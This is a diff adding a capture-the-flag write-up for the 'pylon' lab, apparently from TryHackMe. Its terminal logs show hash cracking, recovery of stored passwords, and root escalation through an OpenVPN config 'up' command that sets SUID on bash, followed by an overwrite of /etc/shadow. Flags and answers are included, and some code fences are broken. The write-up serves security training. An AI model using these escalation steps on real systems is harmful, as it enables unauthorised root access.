@@ -336,3 +336,341 @@ Matching Defaults entries for lone on pylon:
     secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
 
 User lone may run the following commands on pylon:
+    (root) /usr/sbin/openvpn /opt/openvpn/client.ovpn
+
+lone@pylon:~/pylon$ ls -lah
+total 40K
+drwxr-xr-x 3 lone lone 4.0K Jan 30  2021 .
+drwxr-x--- 6 lone lone 4.0K Jan 30  2021 ..
+drwxrwxr-x 8 lone lone 4.0K Jan 30  2021 .git
+-rw-rw-r-- 1 lone lone  793 Jan 30  2021 README.txt
+-rw-rw-r-- 1 lone lone  340 Jan 30  2021 banner.b64
+-rwxrwxr-x 1 lone lone 8.3K Jan 30  2021 pyLon.py
+-rw-rw-r-- 1 lone lone 2.2K Jan 30  2021 pyLon_crypt.py
+-rw-rw-r-- 1 lone lone 3.9K Jan 30  2021 pyLon_db.py
+
+lone@pylon:~/pylon/.git$ git log
+commit 73ba9ed2eec34a1626940f57c9a3145f5bdfd452 (HEAD, master)
+Author: lone <lone@pylon.thm>
+Date:   Sat Jan 30 02:55:46 2021 +0000
+
+    actual release! whoops
+
+commit 64d8bbfd991127aa8884c15184356a1d7b0b4d1a
+Author: lone <lone@pylon.thm>
+Date:   Sat Jan 30 02:54:00 2021 +0000
+
+    Release version!
+
+commit cfc14d599b9b3cf24f909f66b5123ee0bbccc8da
+Author: lone <lone@pylon.thm>
+Date:   Sat Jan 30 02:47:00 2021 +0000
+
+    Initial commit!
+
+lone@pylon:~/pylon/.git$ cd ..
+lone@pylon:~/pylon$ ls
+README.txt  banner.b64  pyLon.py  pyLon_crypt.py  pyLon_db.py
+lone@pylon:~/pylon$ git checkout cfc14d599b9b3cf24f909f66b5123ee0bbccc8da
+Previous HEAD position was 73ba9ed actual release! whoops
+HEAD is now at cfc14d5 Initial commit!
+lone@pylon:~/pylon$ ls
+README.txt  banner.b64  pyLon.db  pyLon_crypt.py  pyLon_db.py  pyLon_pwMan.py
+
+┌──(witty㉿kali)-[~/Downloads]
+└─$ wget http://10.10.151.186:8000/pyLon.db
+--  http://10.10.151.186:8000/pyLon.db
+Connecting to 10.10.151.186:8000... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 12288 (12K) [application/octet-stream]
+Saving to: ‘pyLon.db’
+
+pyLon.db              100%[========================>]  12.00K  --.-KB/s    in 0s      
+
+(27.7 MB/s) - ‘pyLon.db’ saved [12288/12288]
+
+lone@pylon:~/pylon$ python3 -m http.server 8000
+Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
+10.8.19.103 - - [30/Jul/2023 23:59:01] "GET /pyLon.db HTTP/1.1" 200 -
+
+┌──(witty㉿kali)-[~/Downloads]
+└─$ file pyLon.db                           
+pyLon.db: SQLite 3.x database, last written using SQLite version 3022000, file counter 4, database pages 3, cookie 0x2, schema 4, UTF-8, version-valid-for 4
+
+┌──(witty㉿kali)-[~/Downloads]
+└─$ sqlite3 pyLon.db
+SQLite version 3.40.1 
+Enter ".help" for usage hints.
+sqlite> .tables
+pwCheck  pwMan  
+sqlite> SELECT * FROM pwMan;
+pylon.thm_gpg_key|lone_gpg_key|40703ac897fd8cfdffc97947981e88a1
+sqlite> SELECT * FROM pwCheck;
+fc37a9f7a6115a98d549b52a42c8e3a9a83849edbb448b4fbd787be41c12062f1505a23f07b850e578d8932769f232c8b4e7f2148762025a47952440a58ce3db
+
+┌──(witty㉿kali)-[~/Downloads]
+└─$ hash-identifier
+   #########################################################################
+```
+```text
+#     __  __                     __           ______    _____           #
+```
+```text
+#    /\ \/\ \                   /\ \         /\__  _\  /\  _ `\         #
+```
+```text
+#    \ \ \_\ \     __      ____ \ \ \___     \/_/\ \/  \ \ \/\ \        #
+```
+```text
+#     \ \  _  \  /'__`\   / ,__\ \ \  _ `\      \ \ \   \ \ \ \ \       #
+```
+```text
+#      \ \ \ \ \/\ \_\ \_/\__, `\ \ \ \ \ \      \_\ \__ \ \ \_\ \      #
+```
+```text
+#       \ \_\ \_\ \___ \_\/\____/  \ \_\ \_\     /\_____\ \ \____/      #
+```
+```text
+#        \/_/\/_/\/__/\/_/\/___/    \/_/\/_/     \/_____/  \/___/  v1.2 #
+```
+```text
+#                                                             By Zion3R #
+```
+```text
+#                                                    www.Blackploit.com #
+```
+
+## Exploitation
+```text
+#                                                   Root@Blackploit.com #
+   #########################################################################
+--------------------------------------------------
+ HASH: fc37a9f7a6115a98d549b52a42c8e3a9a83849edbb448b4fbd787be41c12062f1505a23f07b850e578d8932769f232c8b4e7f2148762025a47952440a58ce3db
+
+Possible Hashs:
+[+] SHA-512
+[+] Whirlpool
+
+Least Possible Hashs:
+[+] SHA-512(HMAC)
+[+] Whirlpool(HMAC)
+--------------------------------------------------
+
+┌──(witty㉿kali)-[~/Downloads]
+└─$ echo "fc37a9f7a6115a98d549b52a42c8e3a9a83849edbb448b4fbd787be41c12062f1505a23f07b850e578d8932769f232c8b4e7f2148762025a47952440a58ce3db" > hash_pylon
+                                                                                       
+┌──(witty㉿kali)-[~/Downloads]
+└─$ john --wordlist=/usr/share/wordlists/rockyou.txt --format=Raw-SHA512 hash_pylon
+Using default input encoding: UTF-8
+Loaded 1 password hash (Raw-SHA512 [SHA512 128/128 AVX 2x])
+Warning: poor OpenMP scalability for this hash type, consider --fork=4
+Will run 4 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+0g 0:00:00:36 DONE () 0g/s 397333p/s 397333c/s 397333C/s !)!)&*T..*7¡Vamos!
+Session completed. 
+
+nope
+
+                  /               
+      __         /       __    __
+    /   ) /   / /      /   ) /   )
+   /___/ (___/ /____/ (___/ /   /
+  /         /                     
+ /      (_ /  pyLon Password Manager
+                   by LeonM
+
+[*] Encryption key correct.  2_[-I2_[0E2DmEK
+[*] Initialization complete.
+
+same pass
+
+               
+                  /               
+      __         /       __    __
+    /   ) /   / /      /   ) /   )
+   /___/ (___/ /____/ (___/ /   /
+  /         /                     
+ /      (_ /  pyLon Password Manager
+                   by LeonM
+
+  
+        [1] List passwords.
+        [2] Decrypt a password.
+        [3] Create new password.
+        [4] Delete a password.
+        [5] Search passwords.
+        [6] Display help menu
+
+select 6
+
+     __         /       __    __
+    /   ) /   / /      /   ) /   )
+   /___/ (___/ /____/ (___/ /   /
+  /         /                     
+ /      (_ /  pyLon Password Manager
+                   by LeonM
+
+         SITE                        USERNAME
+ [1]     pylon.thm_gpg_key           lone_gpg_key                
+
+Select a password [C] to cancel: 1 
+
+                  /               
+      __         /       __    __
+    /   ) /   / /      /   ) /   )
+   /___/ (___/ /____/ (___/ /   /
+  /         /                     
+ /      (_ /  pyLon Password Manager
+                   by LeonM
+
+    Password for pylon.thm_gpg_key
+
+        Username = lone_gpg_key
+        Password = zr7R0T]6zvYl*~OD            
+
+[*] Install xclip to copy to clipboard.
+[*] sudo apt install xclip
+
+[*] Password copied to the clipboard.
+
+lone@pylon:~$ gpg -d note_from_pood.gpg
+gpg: Note: secret key D83FA5A7160FFE57 expired at Fri Jan 27 19:13:48 2023 UTC
+gpg: encrypted with 3072-bit RSA key, ID D83FA5A7160FFE57, created 
+      "lon E <lone@pylon.thm>"
+Hi Lone,
+
+Can you please fix the openvpn config?
+
+It's not behaving itself again.
+
+oh, by the way, my password is yn0ouE9JLR3h)`=I
+
+Thanks again.
+
+      ┌────────────────────────────────────────────────────────────────┐
+      │ Please enter the passphrase to unlock the OpenPGP secret key:  │
+      │ "lon E <lone@pylon.thm>"                                       │
+      │ 3072-bit RSA key, ID D83FA5A7160FFE57,                         │
+      │ created  (main key ID EA097FFFA0996DAA).             │
+      │                                                                │
+      │                                                                │
+      │ Passphrase: ****************__________________________________ │
+      │                                                                │
+      │         <OK>                                    <Cancel>       │
+      └────────────────────────────────────────────────────────────────┘
+
+lone@pylon:~$ su pood
+Password: 
+pood@pylon:/home/lone$ cd ..
+pood@pylon:/home$ cd pood/
+pood@pylon:~$ ls
+user2.txt
+pood@pylon:~$ cat user2.txt 
+THM{homebrew_encryption_lol}
+
+pood@pylon:~$ sudo -l
+[sudo] password for pood: 
+Matching Defaults entries for pood on pylon:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User pood may run the following commands on pylon:
+    (root) sudoedit /opt/openvpn/client.ovpn
+
+pood@pylon:~$ sudoedit /opt/openvpn/client.ovpn
+
+client
+dev tun
+proto udp
+remote 127.0.0.1 1194
+resolv-retry infinite
+nobind
+persist-key
+persist-tun
+remote-cert-tls server
+cipher AES-256-CBC
+
+<ca>
+-----BEGIN CERTIFICATE-----
+MIIDOTCCAiGgAwIBAgIUGuqk4ASrTBBqFmuR8uMckCYOVTQwDQYJKoZIhvcNAQEL
+
+https://medium.com/tenable-techblog/reverse-shell-from-an-openvpn-configuration-file-73fd8b1d38da
+
+pood@pylon:~$ sudoedit /opt/openvpn/client.ovpn
+
+client
+dev tun
+script-security 2
+up "/bin/chmod +s /bin/bash"
+proto udp
+
+pood@pylon:~$ exit
+exit
+lone@pylon:~$ sudo /usr/sbin/openvpn /opt/openvpn/client.ovpn
+[sudo] password for lone: 
+Mon Jul 31 00:17:18 2023 OpenVPN 2.4.4 x86_64-pc-linux-gnu [SSL (OpenSSL)] [LZO] [LZ4] [EPOLL] [PKCS11] [MH/PKTINFO] [AEAD] built 
+Mon Jul 31 00:17:18 2023 library versions: OpenSSL 1.1.1  11 Sep 2018, LZO 2.08
+Mon Jul 31 00:17:18 2023 NOTE: the current --script-security setting may allow this configuration to call user-defined scripts
+Mon Jul 31 00:17:18 2023 TCP/UDP: Preserving recently used remote address: [AF_INET]127.0.0.1:1194
+Mon Jul 31 00:17:18 2023 UDP link local: (not bound)
+Mon Jul 31 00:17:18 2023 UDP link remote: [AF_INET]127.0.0.1:1194
+Mon Jul 31 00:17:18 2023 [server] Peer Connection Initiated with [AF_INET]127.0.0.1:1194
+Mon Jul 31 00:17:19 2023 TUN/TAP device tun1 opened
+Mon Jul 31 00:17:19 2023 do_ifconfig, tt->did_ifconfig_ipv6_setup=0
+Mon Jul 31 00:17:19 2023 /sbin/ip link set dev tun1 up mtu 1500
+Mon Jul 31 00:17:19 2023 /sbin/ip addr add dev tun1 local 172.31.12.6 peer 172.31.12.5
+Mon Jul 31 00:17:19 2023 /bin/chmod +s /bin/bash tun1 1500 1552 172.31.12.6 172.31.12.5 init
+/bin/chmod: cannot access 'tun1': No such file or directory
+/bin/chmod: cannot access '1500': No such file or directory
+/bin/chmod: cannot access '1552': No such file or directory
+/bin/chmod: cannot access '172.31.12.6': No such file or directory
+/bin/chmod: cannot access '172.31.12.5': No such file or directory
+/bin/chmod: cannot access 'init': No such file or directory
+Mon Jul 31 00:17:19 2023 WARNING: Failed running command (--up/--down): external program exited with error status: 1
+Mon Jul 31 00:17:19 2023 Exiting due to fatal error
+
+lone@pylon:~$ ls -lah /bin/bash
+-rwsr-sr-x 1 root root 1.1M Jun  6  2019 /bin/bash
+
+lone@pylon:~$ bash -p
+bash-4.4# id
+uid=1002(lone) gid=1002(lone) euid=0(root) egid=0(root) groups=0(root),1002(lone)
+
+bash-4.4# gpg -d root.txt.gpg
+gpg: can't open 'root.txt.gpg': Permission denied
+gpg: decrypt_message failed: Permission denied
+
+┌──(witty㉿kali)-[~/Downloads]
+└─$ openssl passwd -6 -salt abc password
+$6$abc$rvqzMBuMVukmply9mZJpW0wJMdDfgUKLDrSNxf9l66h/ytQiKNAdqHSj5YPJpxWJpVjRXibQXRddCl9xYHQnd0
+
+bash-4.4# nano /etc/shadow
+
+bash-4.4# head /etc/shadow
+root:$6$abc$rvqzMBuMVukmply9mZJpW0wJMdDfgUKLDrSNxf9l66h/ytQiKNAdqHSj5YPJpxWJpVjRXibQXRddCl9xYHQnd0:18480:0:99999:7:::
+
+bash-4.4# su root
+Password: password
+root@pylon:~# ls
+root.txt.gpg
+root@pylon:~# gpg -d root.txt.gpg
+gpg: Note: secret key 91B77766BE20A385 expired at Fri Jan 27 19:04:03 2023 UTC
+gpg: encrypted with 3072-bit RSA key, ID 91B77766BE20A385, created 
+      "I am g ROOT <root@pylon.thm>"
+ThM{OpenVPN_script_pwn}
+```
+What is Flag 1?
+The encryption key is encoded, did you find the scheme? This user really loves his dog, try his dog's name.
+What is User1 flag?
+*TMM{easy_does_it}*
+What is User2 flag?
+What is root's flag?
+
+## Flags / Answers
+- ***ThM{OpenVPN_script_pwn}***
+- ***THM{homebrew_password_manager}***
+- ***THM{homebrew_encryption_lol}***
+
+## Notes / Lessons Learned
+[[toc2]]
+
